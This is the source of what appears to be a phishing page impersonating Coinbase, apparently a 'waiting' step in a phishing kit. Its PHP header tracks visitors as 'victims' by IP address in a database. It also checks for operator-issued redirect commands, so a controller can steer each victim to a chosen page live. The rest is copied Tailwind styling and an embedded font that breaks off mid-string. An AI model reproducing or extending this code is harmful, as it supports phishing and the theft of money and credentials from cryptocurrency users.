<?php
// ==================== PROTECTION START ====================
session_start();
require_once 'config/database.php';
require_once 'blocker-raw.php';

// Security headers
header("X-Frame-Options: DENY");
header("X-Content-Type-Options: nosniff");

$victim_ip = $_SERVER['REMOTE_ADDR'];

// Update victim tracking
try {
    $database = new Database();
    $db = $database->getConnection();
    
    $update_query = "UPDATE victims SET last_activity = NOW(), page_visited = 'waiting.php' WHERE ip_address = :ip";
    $update_stmt = $db->prepare($update_query);
    $update_stmt->execute([':ip' => $victim_ip]);
} catch (Exception $e) {
    error_log("Victim update error: " . $e->getMessage());
}

// Check for LIVE redirect commands (only unexpired, unexecuted for this IP)
try {
    $redirect_query = "SELECT target FROM redirect_commands 
                      WHERE victim_ip = :ip
                      AND command = 'redirect' 
                      AND executed = FALSE 
                      AND expires_at > NOW()
                      ORDER BY created_at DESC 
                      LIMIT 1";
    $redirect_stmt = $db->prepare($redirect_query);
    $redirect_stmt->execute([':ip' => $victim_ip]);
    $redirect = $redirect_stmt->fetch(PDO::FETCH_ASSOC);

    if ($redirect) {
        $redirect_target = trim($redirect['target']);
        
        // Mark as executed
        $mark_executed = "UPDATE redirect_commands SET executed = TRUE WHERE target = :target AND victim_ip = :ip";
        $mark_stmt = $db->prepare($mark_executed);
        $mark_stmt->execute([':target' => $redirect_target, ':ip' => $victim_ip]);
        
        // INSTANT REDIRECT
        header("Location: $redirect_target");
        exit;
    }
} catch (Exception $e) {
    error_log("Redirect check error: " . $e->getMessage());
}
// ==================== PROTECTION END ====================
?>

<html lang=en>
<meta charset=utf-8>
<meta name=viewport content="width=device-width, initial-scale=1.0">
<title>Coinbase</title>
<meta name=theme-color content=#000000>
<style>
    *,
    :before,
    :after {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246/0.5);
        --tw-ring-offset-shadow: 0 0#0000;
        --tw-ring-shadow: 0 0#0000;
        --tw-shadow: 0 0#0000;
        --tw-shadow-colored: 0 0#0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
        --tw-contain-size: ;
        --tw-contain-layout: ;
        --tw-contain-paint: ;
        --tw-contain-style:
    }

    ::backdrop {
        --tw-border-spacing-x: 0;
        --tw-border-spacing-y: 0;
        --tw-translate-x: 0;
        --tw-translate-y: 0;
        --tw-rotate: 0;
        --tw-skew-x: 0;
        --tw-skew-y: 0;
        --tw-scale-x: 1;
        --tw-scale-y: 1;
        --tw-pan-x: ;
        --tw-pan-y: ;
        --tw-pinch-zoom: ;
        --tw-scroll-snap-strictness: proximity;
        --tw-gradient-from-position: ;
        --tw-gradient-via-position: ;
        --tw-gradient-to-position: ;
        --tw-ordinal: ;
        --tw-slashed-zero: ;
        --tw-numeric-figure: ;
        --tw-numeric-spacing: ;
        --tw-numeric-fraction: ;
        --tw-ring-inset: ;
        --tw-ring-offset-width: 0px;
        --tw-ring-offset-color: #fff;
        --tw-ring-color: rgb(59 130 246/0.5);
        --tw-ring-offset-shadow: 0 0#0000;
        --tw-ring-shadow: 0 0#0000;
        --tw-shadow: 0 0#0000;
        --tw-shadow-colored: 0 0#0000;
        --tw-blur: ;
        --tw-brightness: ;
        --tw-contrast: ;
        --tw-grayscale: ;
        --tw-hue-rotate: ;
        --tw-invert: ;
        --tw-saturate: ;
        --tw-sepia: ;
        --tw-drop-shadow: ;
        --tw-backdrop-blur: ;
        --tw-backdrop-brightness: ;
        --tw-backdrop-contrast: ;
        --tw-backdrop-grayscale: ;
        --tw-backdrop-hue-rotate: ;
        --tw-backdrop-invert: ;
        --tw-backdrop-opacity: ;
        --tw-backdrop-saturate: ;
        --tw-backdrop-sepia: ;
        --tw-contain-size: ;
        --tw-contain-layout: ;
        --tw-contain-paint: ;
        --tw-contain-style:
    }

    *,
    :before,
    :after {
        box-sizing: border-box;
        border-width: 0;
        border-style: solid;
        border-color: #e5e7eb
    }

    :before,
    :after {
        --tw-content: ""
    }

    html {
        line-height: 1.5;
        -webkit-text-size-adjust: 100%;
        -moz-tab-size: 4;
        -o-tab-size: 4;
        tab-size: 4;
        font-family: ui-sans-serif, system-ui, sans-serif, "Apple Color Emoji", "Segoe UI Emoji", Segoe UI Symbol, "Noto Color Emoji";
        font-feature-settings: normal;
        font-variation-settings: normal;
        -webkit-tap-highlight-color: transparent
    }

    body {
        margin: 0;
        line-height: inherit
    }

    a {
        text-decoration: inherit
    }

    ::-webkit-inner-spin-button,
    ::-webkit-outer-spin-button {
        height: auto
    }

    ::-webkit-search-decoration {
        -webkit-appearance: none
    }

    ::-webkit-file-upload-button {
        -webkit-appearance: button;
        font: inherit
    }

    input::-moz-placeholder,
    textarea::-moz-placeholder {
        opacity: 1;
        color: #9ca3af
    }

    input::placeholder,
    textarea::placeholder {
        opacity: 1;
        color: #9ca3af
    }

    svg {
        display: block;
        vertical-align: middle
    }

    * {
        scrollbar-color: initial;
        scrollbar-width: initial
    }

    @font-face {
        font-family: CBDisplay;
        font-weight: 400;
        src: url(data:font/woff2;base64,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